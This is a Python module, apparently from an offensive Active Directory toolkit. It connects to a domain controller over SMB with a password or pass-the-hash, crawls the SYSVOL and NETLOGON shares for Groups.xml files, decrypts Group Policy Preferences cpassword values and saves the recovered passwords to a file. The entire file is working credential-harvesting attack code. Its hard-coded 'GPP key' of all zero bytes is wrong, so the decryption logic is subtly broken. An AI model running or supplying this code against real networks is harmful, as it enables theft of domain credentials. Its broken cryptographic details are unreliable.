import os
import logging
from core.logger import setup_logger
from impacket.smbconnection import SMBConnection
import xml.etree.ElementTree as ET
import base64
from Crypto.Cipher import AES

logger = setup_logger()

# Default AES key used by GPP (cpassword) – 16 bytes of 0x00
GPP_KEY = bytes.fromhex('00000000000000000000000000000000')

def decrypt_cpassword(cpassword: str) -> str:
    """Decrypt a GPP cpassword attribute.
    The cpassword is base64‑encoded AES‑CBC with a static zero IV.
    Returns the clear‑text password or an empty string on failure.
    """
    try:
        encrypted = base64.b64decode(cpassword)
        iv = bytes(16)  # all zero IV as used by GPP
        cipher = AES.new(GPP_KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted)
        # Remove PKCS7 padding
        pad_len = decrypted[-1]
        if isinstance(pad_len, str):
            pad_len = ord(pad_len)
        clear = decrypted[:-pad_len]
        return clear.decode('utf-16le')
    except Exception as e:
        logger.error(f"[-] Failed to decrypt cpassword: {e}")
        return ""

def spider_gpp(smb: SMBConnection, share: str, workspace: str) -> None:
    """Recursively search the given share for Groups.xml files and extract any cpassword values.
    The function writes any discovered clear‑text passwords to a file in the workspace.
    """
    logger.info(f"[*] Spidering share '{share}' for GPP passwords...")
    try:
        # List root directory using standard '*' wildcard parameter for Impacket listPath
        files = smb.listPath(share, '*')
    except Exception as e:
        logger.error(f"[-] Could not list share {share}: {e}")
        return

    def recurse(path):
        try:
            entries = smb.listPath(share, path + '\\*')
        except Exception:
            return
        for entry in entries:
            if entry.is_directory():
                if entry.get_longname() in ['.', '..']:
                    continue
                recurse(os.path.join(path, entry.get_longname()))
            else:
                if entry.get_longname().lower() == 'groups.xml':
                    full_path = os.path.join(path, entry.get_longname())
                    logger.info(f"[+] Found Groups.xml at {full_path}")
                    try:
                        file_obj = smb.openFile(share, full_path)
                        data = file_obj.read()
                        file_obj.close()
                        root = ET.fromstring(data)
                        for comp in root.iter('Component'):
                            cpass = comp.get('cpassword')
                            if cpass:
                                clear = decrypt_cpassword(cpass)
                                if clear:
                                    logger.info(f"[+] Decrypted GPP password: {clear}")
                                    out_file = os.path.join(workspace, 'gpp_passwords.txt')
                                    with open(out_file, 'a') as f:
                                        f.write(f"{clear}\n")
                    except Exception as e:
                        logger.error(f"[-] Error processing Groups.xml: {e}")

    recurse('\\')

def run_smb_enum(dc_ip: str, username: str, password: str, hashes: str, workspace: str) -> None:
    """Connect to the target DC via SMB, enumerate standard shares, and spider for GPP passwords.
    Parameters:
        dc_ip – IP address of the domain controller.
        username, password, hashes – authentication credentials.
        workspace – path to the workspace where results are stored.
    """
    logger.info("[*] Connecting to SMB on %s...", dc_ip)
    try:
        smb = SMBConnection(dc_ip, dc_ip)
        if hashes:
            if ':' in hashes:
                lm, nt = hashes.split(':', 1)
            else:
                lm, nt = '', hashes
            smb.login(username, '', domain='', lmhash=lm, nthash=nt)
        else:
            smb.login(username, password)
        logger.info("[+] SMB connection established.")
    except Exception as e:
        logger.error(f"[-] SMB connection failed: {e}")
        return

    # Enumerate standard shares (already done elsewhere, but we keep a quick list)
    try:
        shares = smb.listShares()
        for share in shares:
            logger.info(f"[+] Share: {share['shi1_netname']}")
    except Exception as e:
        logger.error(f"[-] Failed to list shares: {e}")

    # Spider SYSVOL and NETLOGON for GPP passwords
    for target_share in ['SYSVOL', 'NETLOGON']:
        if any(s['shi1_netname'][:-1].lower() == target_share.lower() if s['shi1_netname'].endswith('\x00') else s['shi1_netname'].lower() == target_share.lower() for s in shares):
            # Pass target share string without the null byte
            spider_gpp(smb, target_share, workspace)
        else:
            logger.warning(f"[-] Share {target_share} not present, skipping GPP spidering.")

    smb.close()
